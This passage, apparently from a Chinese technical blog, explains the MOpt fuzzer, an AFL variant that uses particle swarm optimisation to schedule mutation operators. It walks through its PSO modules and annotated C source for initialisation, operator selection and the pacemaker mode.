class=\"line\">\t\t\t\tprobability_now[tmp_swarm][i] = x_now[tmp_swarm][i];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">        <span class=\"comment\">// 设置probablility_now为前缀和数组</span></span><br><span class=\"line\">        <span class=\"comment\">// 供select_algorithm使用</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (probability_now[tmp_swarm][operator_num - <span class=\"number\">1</span>] &lt; <span class=\"number\">0.99</span> || probability_now[tmp_swarm][operator_num - <span class=\"number\">1</span>] &gt; <span class=\"number\">1.01</span>) FATAL(<span class=\"string\">&quot;ERROR probability&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tswarm_now = <span class=\"number\">0</span>;</span><br><span class=\"line\">\tkey_module = <span class=\"number\">0</span>; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"MOPT\">MOPT</h1>\n<p>MOpt是针对传统Mutation based fuzz的变异策略的一种改进Fuzzer，主要通过PSO算法优化了变异操作的选取</p>\n<h2 id=\"0x1-核心思路\">0x1.核心思路</h2>\n<h3 id=\"0x1-1-传统Fuzz的变异策略存在的问题\">0x1.1.传统Fuzz的变异策略存在的问题</h3>\n<ul>\n<li>Different operators’ efficiency varies.<br>\n不同Mutation operators的效率不同</li>\n<li>One operator’s efficiency varies with target programs.</li>\n<li>One operator’s efficiency varies over time.</li>\n<li>The scheduler incurs performance overhead.</li>\n<li>Unbalanced data for machine learning.</li>\n</ul>\n<p>这些问题，要求我们用更智能化的方法选择各种Mutation operators</p>\n<h3 id=\"0x1-2-MOpt\">0x1.2.MOpt</h3>\n<p>将每个Mutation operators视为PSO中的一个particle，寻找其最佳概率</p>\n<h4 id=\"0x1-2-1-一些参数\">0x1.2.1.一些参数</h4>\n<ul>\n<li>L~best~ : particle在概率空间中的最佳(对应的优秀测试用例更多)分布</li>\n<li>G~best~ : 区别于传统粒子群算法，在计算时，实际上所有particle分布在不同的概率空间，不可能存在一个传统意义上的适应于所有particle的G~best~，那么同样从全局意义考虑，将所有particle对应的interesting test cases数量之和，作为整个swarm的globel~eff~，而每个partcle在globel~eff~ 中的比例，作为其对应的G~best~</li>\n</ul>\n<h4 id=\"0x1-2-2-overview\">0x1.2.2.overview</h4>\n<p>在每一次fuzz过程中额外的三个task:</p>\n<ul>\n<li>更新每个particle的L~best~ 为效率最高的eff~best~</li>\n<li>更新每个particle的G~best~</li>\n<li>选择最好的swarm指导fuzzing(避免陷入局部最优点)  // 一个疑问</li>\n</ul>\n<p>同时，在每次迭代最后，还要按照PSO算法，更行每个particle的position</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vnow[Si][Pj] ←w × vnow[Si][Pj] </span><br><span class=\"line\">    \t\t+r × (Lbest [Si][Pj] − xnow[Si][Pj]) </span><br><span class=\"line\">    \t\t+r × (Gbest [Pj] − xnow[Si][Pj]). (3) </span><br><span class=\"line\">    </span><br><span class=\"line\">xnow[Si][Pj] ← xnow[Si][Pj] + vnow[Si][Pj]. (4)</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x1-2-3-Main-Framework\">0x1.2.3.Main Framework</h4>\n<p><strong>PSO Initialization Module:</strong></p>\n<p>负责PSO相关参数的初始化:</p>\n<ul>\n<li>设置每个swarm中的每个particle的<em>X~now~</em> 为随机值，并保证每个群中的X~now~之和为1</li>\n<li>把每个particle的*V~now~*设置为0.1</li>\n<li>设置每个particle的*eff~now~*为0</li>\n<li>设置每个particle的*G~best~<em>和</em>L~best~*为0.5</li>\n</ul>\n<p><strong>Pilot Fuzzing Module</strong></p>\n<p>对多个swarm找最优概率分布</p>\n<p><strong>Core Fuzzing Module</strong></p>\n<p>针对一个swarm找最优概率分布</p>\n<p><strong>PSO Updating Module</strong></p>\n<p>根据PSO算法迭代<em>V~now~<em>和</em>X~now~</em></p>\n<p><strong>Pacemaker Fuzzing Mode</strong></p>\n<p>主要是针对Mutation based fuzz的deterministic stage，对于特定的条件，酌情跳过，deterministic stage，以提高效率。</p>\n<p>对于上述模块的具体分析放在源代码分析中。</p>\n<h2 id=\"0x2-源代码分析\">0x2.源代码分析</h2>\n<p>主要分析相对于AFL算法所作的改进， 以源代码中的中文注释为主要形式</p>\n<p>差异部分:</p>\n<p>原调用链：</p>\n<p>main-&gt;fuzz_one</p>\n<p>现调用链:</p>\n<p>main-&gt;fuzz_one-&gt;normal_fuzz / pivot_fuzz / core_fuzz / pso_update</p>\n<p>主要更改了afl-fuzz.c-&gt;fuzz_one-&gt;havoc环节的逻辑</p>\n<p>整体思路(红线部分为我自己添加的MOpt思路，原图来自MOpt原论文，表明AFL的mutatition stage):</p>\n<p><img src=\"./MOpt.png\" alt=\"MOpt\"></p>\n<h3 id=\"0x2-1-main\">0x2.1.main()</h3>\n<p>关注主要逻辑，根据需要，选择性的忽视了一些无关主要逻辑的代码</p>\n<p><strong>新增参数判断</strong></p>\n<p>-L 参数负责控制转入Pacemaker Fuzzing Mode的时间。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;L&#x27;</span>: &#123; <span class=\"comment\">/* MOpt mode */</span></span><br><span class=\"line\"><span class=\"comment\">// L 参数负责控制转入Pacemaker Fuzzing Mode的时间</span></span><br><span class=\"line\">      <span class=\"comment\">// -L 30 相当于24小时左右</span></span><br><span class=\"line\">      <span class=\"comment\">// ref: https://github.com/puppet-meteor/MOpt-AFL</span></span><br><span class=\"line\">          <span class=\"comment\">//if (limit_time_sig)  FATAL(&quot;Multiple -L options not supported&quot;);</span></span><br><span class=\"line\">          limit_time_sig = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"comment\">// </span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">sscanf</span>(optarg, <span class=\"string\">&quot;%llu&quot;</span>, &amp;limit_time_puppet) &lt; <span class=\"number\">1</span> ||</span><br><span class=\"line\">\t\toptarg[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;-&#x27;</span>) FATAL(<span class=\"string\">&quot;Bad syntax used for -L&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tu64 limit_time_puppet2 = limit_time_puppet * <span class=\"number\">60</span> * <span class=\"number\">1000</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (limit_time_puppet2 &lt; limit_time_puppet ) FATAL(<span class=\"string\">&quot;limit_time overflow&quot;</span>);</span><br><span class=\"line\">\t\tlimit_time_puppet = limit_time_puppet2;</span><br><span class=\"line\"></span><br><span class=\"line\">\tSAYF(<span class=\"string\">&quot;limit_time_puppet %llu\\n&quot;</span>,limit_time_puppet);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (limit_time_puppet == <span class=\"number\">0</span> )</span><br><span class=\"line\">\t    key_puppet = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure>\n<p><strong>针对MOpt的全局变量的初始化</strong></p>\n<p>对应于前文的<strong>PSO Initialization Module</strong> 具体内容可以查看前文</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;                <span class=\"comment\">//initialize swarms</span></span><br><span class=\"line\">      <span class=\"type\">int</span> i;</span><br><span class=\"line\">      <span class=\"type\">int</span> tmp_swarm = <span class=\"number\">0</span>;</span><br><span class=\"line\">      swarm_now = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (g_now &gt; g_max) g_now = <span class=\"number\">0</span>;</span><br><span class=\"line\">              w_now = (w_init - w_end)*(g_max - g_now) / (g_max)+w_end;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">for</span> (tmp_swarm = <span class=\"number\">0</span>; tmp_swarm &lt; swarm_num; tmp_swarm++)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">              <span class=\"type\">double</span> total_puppet_temp = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">              swarm_fitness[tmp_swarm] = <span class=\"number\">0.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                      stage_finds_puppet[tmp_swarm][i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">                      probability_now[tmp_swarm][i] = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">                      x_now[tmp_swarm][i] = ((<span class=\"type\">double</span>)(random() % <span class=\"number\">7000</span>)*<span class=\"number\">0.0001</span> + <span class=\"number\">0.1</span>);</span><br><span class=\"line\">                      total_puppet_temp += x_now[tmp_swarm][i];</span><br><span class=\"line\">                      v_now[tmp_swarm][i] = <span class=\"number\">0.1</span>;</span><br><span class=\"line\">                      L_best[tmp_swarm][i] = <span class=\"number\">0.5</span>;</span><br><span class=\"line\">                      G_best[i] = <span class=\"number\">0.5</span>;</span><br><span class=\"line\">                      eff_best[tmp_swarm][i] = <span class=\"number\">0.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++) &#123;</span><br><span class=\"line\">                      stage_cycles_puppet_v2[tmp_swarm][i] = stage_cycles_puppet[tmp_swarm][i];</span><br><span class=\"line\">                      stage_finds_puppet_v2[tmp_swarm][i] = stage_finds_puppet[tmp_swarm][i];</span><br><span class=\"line\">                      x_now[tmp_swarm][i] = x_now[tmp_swarm][i] / total_puppet_temp;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"type\">double</span> x_temp = <span class=\"number\">0.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                      probability_now[tmp_swarm][i] = <span class=\"number\">0.0</span>;</span><br><span class=\"line\">                      v_now[tmp_swarm][i] = w_now * v_now[tmp_swarm][i] + RAND_C * (L_best[tmp_swarm][i] - x_now[tmp_swarm][i]) + RAND_C * (G_best[i] - x_now[tmp_swarm][i]);</span><br><span class=\"line\"></span><br><span class=\"line\">                      x_now[tmp_swarm][i] += v_now[tmp_swarm][i];</span><br><span class=\"line\"></span><br><span class=\"line\">                      <span class=\"keyword\">if</span> (x_now[tmp_swarm][i] &gt; v_max)</span><br><span class=\"line\">                              x_now[tmp_swarm][i] = v_max;</span><br><span class=\"line\">                      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (x_now[tmp_swarm][i] &lt; v_min)</span><br><span class=\"line\">                              x_now[tmp_swarm][i] = v_min;</span><br><span class=\"line\"></span><br><span class=\"line\">                      x_temp += x_now[tmp_swarm][i];</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">              &#123;</span><br><span class=\"line\">                      x_now[tmp_swarm][i] = x_now[tmp_swarm][i] / x_temp;</span><br><span class=\"line\">                      <span class=\"keyword\">if</span> (likely(i != <span class=\"number\">0</span>))</span><br><span class=\"line\">                              probability_now[tmp_swarm][i] = probability_now[tmp_swarm][i - <span class=\"number\">1</span>] + x_now[tmp_swarm][i];</span><br><span class=\"line\">                      <span class=\"keyword\">else</span></span><br><span class=\"line\">                              probability_now[tmp_swarm][i] = x_now[tmp_swarm][i];</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (probability_now[tmp_swarm][operator_num - <span class=\"number\">1</span>] &lt; <span class=\"number\">0.99</span> || probability_now[tmp_swarm][operator_num - <span class=\"number\">1</span>] &gt; <span class=\"number\">1.01</span>)</span><br><span class=\"line\">                  FATAL(<span class=\"string\">&quot;ERROR probability&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; operator_num; i++)</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">              core_operator_finds_puppet[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">              core_operator_finds_puppet_v2[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">              core_operator_cycles_puppet[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">              core_operator_cycles_puppet_v2[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">              core_operator_cycles_puppet_v3[i] = <span class=\"number\">0</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x2-2-select-algorithm\">0x2.2.select_algorithm()</h3>\n<p>根据PSO获得的概率分布，选择不同的变异算法</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">select_algorithm</span><span class=\"params\">(<span class=\"type\">int</span> extras)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"type\">int</span> i_puppet, j_puppet;</span><br><span class=\"line\">  <span class=\"comment\">//double total_puppet = 0.0;</span></span><br><span class=\"line\"><span class=\"comment\">//srandom(time(NULL));</span></span><br><span class=\"line\"></span><br><span class=\"line\">    u32 seed[<span class=\"number\">2</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    ck_read(dev_urandom_fd, &amp;seed, <span class=\"keyword\">sizeof</span>(seed), <span class=\"string\">&quot;/dev/urandom&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    srandom(seed[<span class=\"number\">0</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">//double sele = ((double)(random()%10000)*0.0001);</span></span><br><span class=\"line\">  <span class=\"comment\">//SAYF(&quot;select : %f\\n&quot;,sele);</span></span><br><span class=\"line\">  j_puppet = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"type\">int</span> operator_number = operator_num;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (extras &lt; <span class=\"number\">2</span>) operator_number = operator_number - <span class=\"number\">2</span>;</span><br><span class=\"line\">  <span class=\"type\">double</span> range_sele = (<span class=\"type\">double</span>)probability_now[swarm_now][operator_number - <span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"type\">double</span> sele = ((<span class=\"type\">double</span>)(random() % <span class=\"number\">10000</span>) * <span class=\"number\">0.0001</span> * range_sele);</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">// 这里的probability_now由pso_uadating()确定</span></span><br><span class=\"line\"><span class=\"comment\">// probability_now是一个概率的前缀和数组，</span></span><br><span class=\"line\"><span class=\"comment\">// 最后一位也就是probability_now[swarm_now][operator_number - 1]应该为1</span></span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">for</span> (i_puppet = <span class=\"number\">0</span>; i_puppet &lt; operator_number; i_puppet++)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (unlikely(i_puppet == <span class=\"number\">0</span>))</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (sele &lt; probability_now[swarm_now][i_puppet])</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (sele &lt; probability_now[swarm_now][i_puppet])</span><br><span class=\"line\">          &#123;</span><br><span class=\"line\">              j_puppet =<span class=\"number\">1</span>;</span><br><span class=\"line\">              <span class=\"keyword\">break</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"comment\">// 由上面对于sele的分析，可以知道这里是按照对应的概率设置i_puppet</span></span><br><span class=\"line\">  <span class=\"comment\">// i_puppet对应选择到的操作</span></span><br><span class=\"line\">    </span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((j_puppet ==<span class=\"number\">1</span> &amp;&amp; sele &lt; probability_now[swarm_now][i_puppet<span class=\"number\">-1</span>]) || (i_puppet + <span class=\"number\">1</span> &lt; operator_num &amp;&amp; sele &gt; probability_now[swarm_now][i_puppet +  <span class=\"number\">1</span>]))</span><br><span class=\"line\">    FATAL(<span class=\"string\">&quot;error select_algorithm&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> i_puppet;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x2-2-fuzz-one\">0x2.2.fuzz_one()</h3>\n<p>fuzz_one() 是完成Mutation operators的核心流程，在main()中每一次fuzz循环中被调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> u8 <span class=\"title function_\">fuzz_one</span><span class=\"params\">(<span class=\"type\">char</span>** argv)</span> &#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> key_val_lv = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (limit_time_sig == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\tkey_val_lv = normal_fuzz_one(argv);</span><br><span class=\"line\">    \t<span class=\"comment\">// normal_fuzz_one() 是原来AFL的fuzz_one()</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (key_module == <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\tkey_val_lv = pilot_fuzzing(argv);</span><br><span class=\"line\">        \t<span class=\"comment\">// 对应0x1.2.3.Main Framework 中的pilot fuzzing module</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (key_module == <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\tkey_val_lv = core_fuzzing(argv);</span><br><span class=\"line\">        \t<span class=\"comment\">// 对应core fuzzing module</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (key_module == <span class=\"number\">2</span>)</span><br><span class=\"line\">\t\t\tpso_updating();</span><br><span class=\"line\">        \t<span class=\"comment\">// 对应PSO updating module</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> key_val_lv;\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x2-3-pilot-fuzzing\">0x2.3.pilot_fuzzing()</h3>\n<p>这是整个MOpt的核心模块，他是在原AFL的基础上修改得到的，所以主要分析和原AFL的差异部分。</p>\n<p>core_pilot与此类似，所以不做单独分析</p>\n<h4 id=\"0x2-3-1-Pacemaker-Fuzzing-Mode\">0x2.3.1.Pacemaker Fuzzing Mode</h4>\n<p>由于deterministic stage的小型改动在前期比较有用，在后期长时间处于deterministic stage会导致效率下降，所以在原fuzz_one() 直接跳到havoc_stage() 的逻辑后面，增加一个时间判断，判断是否要直接跳到havoc_stage()</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// line 6999 in afl_fuzz.c</span></span><br><span class=\"line\"></span><br><span class=\"line\">cur_ms_lv = get_cur_time();</span><br><span class=\"line\"><span class=\"comment\">// 获取当前时间</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!(key_puppet == <span class=\"number\">0</span> &amp;&amp; ((cur_ms_lv - last_path_time &lt; limit_time_puppet) </span><br><span class=\"line\">        (last_crash_time != <span class=\"number\">0</span> &amp;&amp; cur_ms_lv - last_crash_time &lt; limit_time_puppet) || last_path_time == <span class=\"number\">0</span>)))</span><br><span class=\"line\"><span class=\"comment\">// 如果距离上一次crash或者找到新路径的时间，超过了通过-L参数设置的limit_time_puppet</span></span><br><span class=\"line\"><span class=\"comment\">// 说明长时间陷入了deterministic stage</span></span><br><span class=\"line\"><span class=\"comment\">// 直接跳过deterministic stage进入havoc_stage()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        key_puppet = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> pacemaker_fuzzing;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x2-3-2-Mutation-operators-select\">0x2.3.2.Mutation operators select</h4>\n<p>在havoc阶段，要进行变异策略的选择，相比于原来的随机选择，MOpt根据PSO得到的概率分布进行策略的选择</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// line 8165 in afl-fuzz.c</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">switch</span> (select_algorithm( extras_cnt + a_extras_cnt )) </span><br></pre></td></tr></table></figure>\n<h4 id=\"0x2-3-3-Before-return\">0x2.3.3.Before return</h4>\n<p>返回前新增的一些变化</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (key_puppet == <span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"comment\">//一个小型的flag</span></span><br><span class=\"line\"><span class=\"comment\">//在前面pacemaker的跳转时被设置为1</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (unlikely(queued_paths + unique_crashes &gt; ((queued_paths + unique_crashes)*limit_time_bound + orig_hit_cnt_puppet)))</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">                key_puppet = <span class=\"number\">0</span>;</span><br><span class=\"line\">                cur_ms_lv = get_cur_time();</span><br><span class=\"line\">                new_hit_cnt = queued_paths + unique_crashes;</span><br><span class=\"line\">                orig_hit_cnt_puppet = <span class=\"number\">0</span>;</span><br><span class=\"line\">                